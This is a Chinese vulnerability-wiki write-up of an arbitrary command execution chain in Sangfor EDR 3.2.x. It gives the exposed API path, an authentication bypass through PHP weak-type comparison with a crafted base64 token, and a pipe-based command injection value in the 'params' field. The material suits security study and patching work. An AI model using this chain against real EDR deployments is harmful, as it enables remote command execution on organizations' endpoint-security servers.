深信服 终端检测相应平台（EDR） 任意命令执行漏洞（二）
=====================================================

一、漏洞简介
------------

二、漏洞影响
------------

深信服EDR 3.2.16

深信服EDR 3.2.17

深信服EDR 3.2.19

三、复现过程
------------

![1.jpg](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(二)/media/rId24.jpg)

dev\_linkage\_launch.php
为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口

主要调用

![2.jpg](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(二)/media/rId25.jpg)

跟进

![3.jpg](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(二)/media/rId26.jpg)

可以看到 第一个检查为 \$req\_url = \$\_SERVER\['PHP\_SELF'\];

绕过第一个检查:

在他们系统nginx配置文件里面:

![4.jpg](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(二)/media/rId27.jpg)

**通过nginx规则可以得知**\*\*,**他们没有设置禁止外网访问**.\*\***从而可以直接访问**

/api/edr/sangforinter/v2/xxx 绕过 第一个检查

**第二检查**\*\*:\*\* **权限检查**

![5.jpg](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(二)/media/rId28.jpg)

跟进check\_access\_token

![6.jpg](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(二)/media/rId29.jpg)

**这里\*\*\*\*if(\$md5\_str == \$json\_token\["md5"\])**
**引发第二个漏洞**\*\*: php\*\*\*\*弱类型导致的漏洞\*\*

**绕过只需要传入一个base64编码的json内容为**
\*\*{"md5":true}\*\***即可**

**至此** **权限检查绕过完毕**

**来到** process\_cssp.php 文件

![7.jpg](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(二)/media/rId30.jpg)

存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的.`https://www.0-sec.org:8443//api/edr/sangforinter/v2/cssp/slog_client?token=eyJyYW5kb20iOiIxIiwgIm1kNSI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIn0=`

绕过:`{“params”:”|命令”}`

结果如下:

![WechatIMG18.jpeg](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(二)/media/rId31.jpg)
